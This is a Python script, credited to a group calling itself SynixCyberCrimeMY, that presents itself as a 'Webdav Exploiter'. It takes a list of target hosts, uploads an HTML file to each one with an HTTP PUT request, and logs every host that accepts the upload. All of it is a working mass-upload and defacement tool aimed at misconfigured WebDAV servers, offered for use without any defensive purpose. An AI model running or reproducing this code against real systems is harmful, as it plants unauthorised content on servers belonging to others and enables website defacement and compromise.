# Coded By SamuraiMelayu1337 / SynixCyberCrimeMY

import requests, sys, os, colorama, time, ctypes, datetime, sys, platform, getpass, urllib3, concurrent.futures
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from datetime import date
from time import gmtime, strftime
from sys import stdout
from colorama import Fore, init
from colorama import *

os.system("clear")

print(f"""{Style.BRIGHT + Fore.YELLOW}
{Fore.RED}════════════════════════════════════════════════════════════════════════════════════
 (                       *         )  
 )\ )   (      (       (  `     ( /(  
(()/(   )\     )\      )\))(    )\()) 
 /(_))(((_)  (((_)    ((_)()\  ((_)\  
(_))  )\___  )\___    (_()((_)__ ((_)          SynixCyberCrimeMY Webdav Exploiter
/ __|((/ __|((/ __|   |  \/  |\ \ / /       Made By SamuraiMelayu1337 & ?/h4zzzzz.scc
\__ \ | (__  | (__  _ | |\/| | \ V /            Using pip3 install -r requirements.txt
|___/  \___|  \___|(_)|_|  |_|  |_|   
{Fore.RED}════════════════════════════════════════════════════════════════════════════════════                      """)

if len(sys.argv) != 3:
 print("\n\033[34;1m[*]\033[0m python "+sys.argv[0]+" list.txt script.html")
 exit(0)

print("\n\033[34;1m[*]\033[0m Python WebDav Exploiter\n\033[34;1m[*]\033[0m Sharing Information Technology\n")

target = open(sys.argv[1], 'r')
while True:
 scheker = open(sys.argv[2]).read()
 sukses = open('webdav_result.txt', 'a')
 host = target.readline().replace('\n','')
 if not host:
  break
 if not host.startswith('http'):
  host = 'http://' + host
 outname = '/'+sys.argv[2]
 print('\033[34;1m[*]\033[0m Sending Files : '+sys.argv[2])
 print('\033[34;1m[*]\033[0m Size File     : '+str(len(scheker)))
 print('\033[34;1m[*]\033[0m Target        : '+host)
 try:
    r = requests.request('put', host + outname, data=scheker, headers={'Content-Type':'application/octet-stream'})
 except:
    print('\033[31;1m[-]\033[0m Failed        : Null Respone\n')
    pass
    continue
 if r.status_code == 200:
  print('\033[32;1m[+]\033[0m Sukses        : '+host+outname+'\n')
  sukses.write(host+outname+'\n')
 else:
  print('\033[31;1m[-]\033[0m Failed        : '+host+outname+'\n')

print("\033[34;1m[*]\033[0m Output Saved On : exploiter_output.txt")              